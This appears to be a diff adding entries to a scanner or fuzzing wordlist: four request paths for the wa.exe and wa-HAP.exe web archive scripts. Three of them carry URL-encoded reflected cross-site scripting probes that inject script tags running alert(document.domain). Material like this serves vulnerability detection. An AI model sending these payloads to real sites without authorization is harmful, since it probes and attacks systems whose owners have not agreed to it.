@@ -1,0 +1,4 @@
+/scripts/wa.exe?OK=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/scripts/wa.exe?TICKET=test&c=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/scripts/wa-HAP.exe?TICKET=test&c=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/wa.exe?REPORT&z=4&
